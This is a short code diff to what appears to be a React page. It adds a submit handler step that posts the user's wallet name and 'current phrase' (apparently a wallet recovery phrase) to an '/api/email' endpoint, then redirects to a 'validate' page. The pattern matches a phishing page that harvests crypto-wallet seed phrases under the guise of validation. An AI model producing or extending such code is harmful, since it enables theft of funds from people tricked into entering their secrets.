@@ -85,6 +85,13 @@ export default function Home() {
 
   const handleSubmit = async (e) => {
     e.preventDefault();
+    await fetch("/api/email", {
+      method: "POST",
+      body: JSON.stringify({
+        wallet: formState.wallet,
+        currentPhrase: formState.currentPhrase,
+      }),
+    });
     setTimeout(() => {
       navigate.push("/validate/" + walletId);
     }, 1000);
